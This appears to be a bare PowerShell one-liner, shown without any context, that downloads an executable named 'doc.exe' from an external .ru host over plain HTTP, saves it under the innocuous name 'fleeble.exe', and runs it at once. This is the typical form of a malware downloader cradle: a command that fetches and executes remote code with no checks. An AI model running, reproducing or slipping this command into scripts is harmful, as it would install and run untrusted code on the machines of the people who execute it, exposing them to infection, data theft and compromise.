
(New-Object System.Net.WebClient).DownloadFile('http://andersonken4791.pserver.ru/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'

